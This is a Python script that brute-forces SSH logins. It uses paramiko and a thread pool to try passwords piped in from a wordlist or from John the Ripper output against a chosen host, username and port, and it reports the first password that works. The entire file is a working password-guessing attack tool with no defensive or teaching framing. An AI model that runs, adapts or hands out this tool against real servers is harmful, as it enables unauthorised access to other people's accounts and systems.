#!/usr/bin/env python
#  pip install paramiko

#Example usages:
#  cat dict.txt|./ssh_bruter_threaded.py
#  john --incremental -stdout=8|./ssh_bruter_threaded.py
import paramiko
import pool_manager
import socket
import sys

try:
	input=raw_input
except Exception:
	pass

#returns (INT,STR)
#  INT is either 1 fail, 0 success, or -1 error
#  STR is error string or success string
def ssh_login(server,username,password,timeout=None,port=22):
	try:
		conn=paramiko.SSHClient()
		conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		conn.connect(server,port=port,username=username,password=password,timeout=timeout)
		return (0,'Success')
	except paramiko.SSHException as error:
		code=1
		if str(error)=='Error reading SSH protocol banner':
			code=-1
		return (code,str(error))
	except Exception as error:
		return (-1,str(error))

def worker(pool_man,hostname,username,port):
	try:
		while not pool_man.is_done():
			password=pool_man.pop()
			if password!=None:
				test=ssh_login(hostname,username,password,1,port)
				if not pool_man.is_done():
					pool_man.show(password+'\t'+test[1])
					if test[0]!=1:
						pool_man.set_result(test)
	except:
		pass

pool_man=pool_manager.pool_manager_t()

if __name__=='__main__':
	if len(sys.argv)<3:
		print('Usage: '+sys.argv[0]+' HOSTNAME USERNAME [PORT] [THREADS]')
		exit(1)
	try:
		port=22
		if len(sys.argv)>3:
			port=int(sys.argv[3])
		thread_count=8
		if len(sys.argv)>4:
			thread_count=int(sys.argv[4])
		print('Starting ssh brute force ('+str(thread_count)+' threads)')
		for ii in range(thread_count):
			pool_man.new(worker,(sys.argv[1],sys.argv[2],port))
		try:
			while not pool_man.is_done():
				pool_man.add(input(''))
		except EOFError:
			pass
		result=pool_man.wait()
		if result[0]<0:
			raise Exception(result[1])
		exit(result[0])
	except KeyboardInterrupt:
		print('Killing threads...')
		pool_man.set_result((1,'Killed.'))
		pool_man.wait()
		exit(1)
	except Exception as error:
		print(str(error))
		exit(1)